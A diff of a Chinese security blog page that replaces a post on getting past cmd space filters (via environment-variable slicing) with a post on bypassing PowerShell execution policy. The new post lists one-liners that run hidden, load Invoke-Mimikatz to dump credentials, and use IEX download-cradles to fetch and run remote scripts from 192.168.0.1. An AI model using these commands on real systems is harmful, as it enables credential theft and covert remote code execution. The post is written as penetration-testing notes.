@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Windows,命令执行,">
+  <meta name="keywords" content="Powershell,Windows,">
 
 
 
@@ -81,21 +81,20 @@
 
 
 
-<meta name="description" content="cmd绕过空格过滤Ps：从大佬那里学的一点小技巧 Windows支持环境变量切片操作，可以切割出一个空格接上。  set //查看环境变量   net%CommonProgramFiles:~10,-18%user   意思是把CommonProgramFiles变量的正数10位和倒数18位全部切除，然后就剩下一个空格。形变为net user既  CommonProgramFiles=C:\Pro">
-<meta name="keywords" content="Windows,命令执行">
+<meta name="description" content="绕过Powershell执行策略执行ps脚本。 由于powershell默认是不允许执行ps脚本的* 管理员可以改为允许 *，但ps脚本又是渗透测试中非常有用也非常必要的工具，所以想办法绕过执行策略还是非常有必要的。  总结如下 本地绕过权限执行. powershell -executionpolicy bypass -file xxx.ps1 本地隐藏绕过权限执行. powershell -ex">
+<meta name="keywords" content="Powershell,Windows">
 <meta property="og:type" content="article">
-<meta property="og:title" content="cmd绕过空格过滤">
+<meta property="og:title" content="绕过Powershell执行策略执行ps脚本。">
 <meta property="og:url" content="https://github.com/scareing/scareing.github.io/2019/08/26/1566846777/index.html">
 <meta property="og:site_name" content="scareing的学习笔记">
-<meta property="og:description" content="cmd绕过空格过滤Ps：从大佬那里学的一点小技巧 Windows支持环境变量切片操作，可以切割出一个空格接上。  set //查看环境变量   net%CommonProgramFiles:~10,-18%user   意思是把CommonProgramFiles变量的正数10位和倒数18位全部切除，然后就剩下一个空格。形变为net user既  CommonProgramFiles=C:\Pro">
+<meta property="og:description" content="绕过Powershell执行策略执行ps脚本。 由于powershell默认是不允许执行ps脚本的* 管理员可以改为允许 *，但ps脚本又是渗透测试中非常有用也非常必要的工具，所以想办法绕过执行策略还是非常有必要的。  总结如下 本地绕过权限执行. powershell -executionpolicy bypass -file xxx.ps1 本地隐藏绕过权限执行. powershell -ex">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/06/cmd%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4/1.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/06/cmd%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4/1.png">
-<meta property="og:updated_time" content="2019-10-04T08:28:29.702Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/27/%E7%BB%95%E8%BF%87Powershell%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5%E6%89%A7%E8%A1%8Cps%E8%84%9A%E6%9C%AC%E3%80%82/1.jpg">
+<meta property="og:updated_time" content="2019-10-04T08:28:29.343Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="cmd绕过空格过滤">
-<meta name="twitter:description" content="cmd绕过空格过滤Ps：从大佬那里学的一点小技巧 Windows支持环境变量切片操作，可以切割出一个空格接上。  set //查看环境变量   net%CommonProgramFiles:~10,-18%user   意思是把CommonProgramFiles变量的正数10位和倒数18位全部切除，然后就剩下一个空格。形变为net user既  CommonProgramFiles=C:\Pro">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/06/cmd%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4/1.png">
+<meta name="twitter:title" content="绕过Powershell执行策略执行ps脚本。">
+<meta name="twitter:description" content="绕过Powershell执行策略执行ps脚本。 由于powershell默认是不允许执行ps脚本的* 管理员可以改为允许 *，但ps脚本又是渗透测试中非常有用也非常必要的工具，所以想办法绕过执行策略还是非常有必要的。  总结如下 本地绕过权限执行. powershell -executionpolicy bypass -file xxx.ps1 本地隐藏绕过权限执行. powershell -ex">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/27/%E7%BB%95%E8%BF%87Powershell%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5%E6%89%A7%E8%A1%8Cps%E8%84%9A%E6%9C%AC%E3%80%82/1.jpg">
 
 
 
@@ -131,7 +130,7 @@
 
 
 
-  <title>cmd绕过空格过滤 | scareing的学习笔记</title>
+  <title>绕过Powershell执行策略执行ps脚本。 | scareing的学习笔记</title>
   
 
 
@@ -285,7 +284,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">cmd绕过空格过滤</h1>
+          <h1 class="post-title" itemprop="name headline">绕过Powershell执行策略执行ps脚本。</h1>
         
 
         <div class="post-meta">
@@ -320,8 +319,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/杂项/" itemprop="url" rel="index">
-                    <span itemprop="name">杂项</span>
+                  <a href="/categories/Powershell/" itemprop="url" rel="index">
+                    <span itemprop="name">Powershell</span>
                   </a>
                 </span>
 
@@ -357,17 +356,22 @@
       
 
       
-        <h1 id="cmd绕过空格过滤"><a href="#cmd绕过空格过滤" class="headerlink" title="cmd绕过空格过滤"></a>cmd绕过空格过滤</h1><p>Ps：<strong>从大佬那里学的一点小技巧</strong></p>
-<p>Windows支持环境变量切片操作，可以切割出一个空格接上。</p>
-<blockquote>
-<p>set //查看环境变量</p>
+        <h1 id="绕过Powershell执行策略执行ps脚本。"><a href="#绕过Powershell执行策略执行ps脚本。" class="headerlink" title="绕过Powershell执行策略执行ps脚本。"></a>绕过Powershell执行策略执行ps脚本。</h1><blockquote>
+<p>由于powershell默认是不允许执行ps脚本的<strong>* 管理员可以改为允许 *</strong>，但ps脚本又是渗透测试中非常有用也非常必要的工具，所以想办法绕过执行策略还是非常有必要的。</p>
 </blockquote>
-<blockquote>
-<p>net%CommonProgramFiles:~10,-18%user </p>
-<p> 意思是把CommonProgramFiles变量的正数10位和倒数18位全部切除，然后就剩下一个空格。形变为net user<br>既</p>
-</blockquote>
-<pre><code>CommonProgramFiles=C:\Program Files\Common Files
-net%CommonProgramFiles:~10,-18%user=net user</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/06/cmd%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4/1.png" alt="avatar"><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/06/cmd%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4/1.png" alt="avatar"><br>** 经测试在win7,win10,win8,win2008,win2003,均有效</p>
+<h2 id="总结如下"><a href="#总结如下" class="headerlink" title="总结如下"></a>总结如下</h2><ul>
+<li><p>本地绕过权限执行.</p>
+<pre><code>powershell -executionpolicy bypass -file xxx.ps1</code></pre></li>
+<li><p>本地隐藏绕过权限执行.</p>
+<pre><code>powershell -executionpolicy bypass -windowsstyle hideden -nologo -nonlnteractive -noprofile -file xxx.ps1</code></pre></li>
+<li><p>本地导入ps1脚本，并执行函数.</p>
+<pre><code>powershell.exe -exec bypass -Command &quot;Import-Module C:\Invoke-Mimikatz.ps1&quot;;Invoke-Mimikatz -DumpCreds</code></pre></li>
+<li><p>本地使用IEX下载远程ps1绕过执行.</p>
+<pre><code>powershell.exe &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.0.1/mimikatz.ps1&apos;); Invoke-Mimikatz -DumpCreds&quot;</code></pre></li>
+<li><p>本地使用IEX下载远程ps1隐藏绕过权限执行.</p>
+<pre><code>powershell -executionpolicy bypass -windowstyle hidden -nologo -noprofile IEX(new-object system.net.webclient).downloadstring(&quot;http://192.168.0.1/1025.ps1&quot;)    </code></pre><p>  <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/27/%E7%BB%95%E8%BF%87Powershell%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5%E6%89%A7%E8%A1%8Cps%E8%84%9A%E6%9C%AC%E3%80%82/1.jpg" alt="avatar"></p>
+</li>
+</ul>
 
       
     </div>
@@ -385,9 +389,9 @@ net%CommonProgramFiles:~10,-18%user=net user</code></pre><p><img src="https://ra
       
         <div class="post-tags">
           
-            <a href="/tags/Windows/" rel="tag"># Windows</a>
+            <a href="/tags/Powershell/" rel="tag"># Powershell</a>
           
-            <a href="/tags/命令执行/" rel="tag"># 命令执行</a>
+            <a href="/tags/Windows/" rel="tag"># Windows</a>
           
         </div>
       
@@ -406,8 +410,8 @@ net%CommonProgramFiles:~10,-18%user=net user</code></pre><p><img src="https://ra
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/08/26/1566846777/" rel="prev" title="绕过Powershell执行策略执行ps脚本。">
-                绕过Powershell执行策略执行ps脚本。 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/08/26/1566846777/" rel="prev" title="Nishang模块简介及演示">
+                Nishang模块简介及演示 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -559,7 +563,7 @@ net%CommonProgramFiles:~10,-18%user=net user</code></pre><p><img src="https://ra
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#cmd绕过空格过滤"><span class="nav-number">1.</span> <span class="nav-text">cmd绕过空格过滤</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#绕过Powershell执行策略执行ps脚本。"><span class="nav-number">1.</span> <span class="nav-text">绕过Powershell执行策略执行ps脚本。</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#总结如下"><span class="nav-number">1.1.</span> <span class="nav-text">总结如下</span></a></li></ol></li></ol></div>
             
 
           </div>
